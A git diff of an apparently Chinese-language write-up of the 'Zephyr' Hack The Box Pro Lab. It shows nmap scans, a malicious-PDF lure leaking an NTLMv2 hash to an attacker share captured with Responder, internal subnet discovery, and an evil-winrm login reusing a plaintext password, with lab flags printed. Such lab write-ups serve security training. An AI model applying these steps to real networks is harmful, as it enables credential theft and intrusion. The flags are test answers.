@@ -1,3 +1,6 @@
+---
+toc_max_heading_level: 6
+---
 # Zephyr
 ## 场景描述
 ## 10.10.110.0/24(nmap)
@@ -20,7 +23,7 @@ PORT    STATE SERVICE
 
 Nmap done: 256 IP addresses (2 hosts up) scanned in 87.62 seconds
 ```
-### 10.10.110.35(入口机、网卡一\riley)
+### 10.10.110.35(入口机、网卡一\mail)
 详细版本扫描
 ```python
 ┌──(root㉿Rookie)-[/home/rookie/Desktop/Bad-Pdf]
@@ -126,7 +129,7 @@ trailer
 
 ```
 :::note
-本质是hr在带有老版本的adobe域内点击了badpf，导致NTLMv2-SSP Hash发送到`\\\\10.10.14.9\\test`,所以我们开始监听就好了
+本质是hr在带有老版本的adobe域内点击了badpdf，导致NTLMv2-SSP Hash发送到`\\\\10.10.14.9\\test`,所以我们开始监听就好了
 :::
 ```python
 player@HTB-pro-labs:~$ sudo /root/github/Responder/Responder.py -I tun0 -F -v
@@ -244,4 +247,83 @@ agent  flag.txt  nmap
 riley@mail:~$ cat flag.txt 
 ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}  #人类的错误是致命的
 ```
+#### 发现内网段192.168.110.*
+```python
+riley@mail:~$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.110.51  netmask 255.255.255.0  broadcast 192.168.110.255
+        inet6 fe80::250:56ff:fe94:c339  prefixlen 64  scopeid 0x20<link>
+        ether 00:50:56:94:c3:39  txqueuelen 1000  (Ethernet)
+        RX packets 39041  bytes 32330274 (32.3 MB)
+        RX errors 0  dropped 51  overruns 0  frame 0
+        TX packets 33522  bytes 16083072 (16.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 32560  bytes 2332756 (2.3 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 32560  bytes 2332756 (2.3 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+##### arp嗅探
+```python
+riley@mail:~$ arp -a
+? (192.168.110.56) at 00:50:56:b9:84:a9 [ether] on eth0
+? (192.168.110.53) at 00:50:56:b9:aa:8d [ether] on eth0
+? (192.168.110.52) at 00:50:56:b9:dc:9e [ether] on eth0
+? (192.168.110.55) at 00:50:56:b9:75:58 [ether] on eth0
+? (192.168.110.54) at 00:50:56:b9:cc:cd [ether] on eth0
+_gateway (192.168.110.1) at 00:50:56:b9:fb:40 [ether] on eth0
+```
+发现如下ip
+:::info
+```
+192.168.110.1  (firewall)
+192.168.110.51 (入口机、网卡二)
+192.168.110.52
+192.168.110.53
+192.168.110.54
+192.168.110.55
+192.168.110.56
+```
+:::
+## 192.168.110.56()
+```python
+riley@mail:~$ ./nmap -Pn -T4 -sT --min-rate="1000" -p-  192.168.110.56
+
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-05 06:33 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 192.168.110.56
+Host is up (0.00056s latency).
+Not shown: 65534 filtered ports
+PORT     STATE SERVICE
+5985/tcp open  unknown
+```
+### 尝试使用域内用户riley登陆
+```python
+┌──(root㉿Rookie)-[/home/rookie/Desktop]
+└─# proxychains evil-winrm -u riley -p P@ssw0rd  -i 192.168.110.56
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  192.248.165.125:58888  ...  192.168.110.56:5985  ...  OK
+*Evil-WinRM* PS C:\Users\riley\Documents>
+*Evil-WinRM* PS C:\Users\riley\Documents> cd ../../Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
+ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}
+```
+#### 0000
+##### 1111
+###### 7777
